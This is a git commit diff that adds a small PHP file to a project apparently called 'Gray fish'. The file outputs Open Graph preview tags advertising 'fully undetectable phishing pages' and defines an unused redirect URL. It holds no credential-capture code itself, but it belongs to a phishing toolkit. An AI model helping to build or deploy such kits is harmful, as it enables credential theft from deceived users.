373394a08b0d6c41fb7dc1efa050223e34535a5c
Gray Programmerz <hackrefisher@gmail.com>
2019-09-15 20:33:44 +0500

    Add files via upload

---
+++ Gray fish/sites/phishing_info/tumblr.php
@@ -0,0 +1,12 @@
+<?php
+$redirect='https://tiplava.blogspot.com/';
+echo "<!DOCTYPE html><html><head>
+
+<meta property=og:title content=' Gray Fish v2019.09'>
+<meta property=og:description content='Gray Fish provides fully undetectable phishing pages.'>
+<meta property=og:image content='https://i.ibb.co/PmH73X4/index.png'>
+<meta property=og:type content='website'>
+
+<!--Instead you can add this tag if you want <meta property=og:url content=http://youtube.com/c/greenterminals/>--></head><body></body></html>";
+
+?>
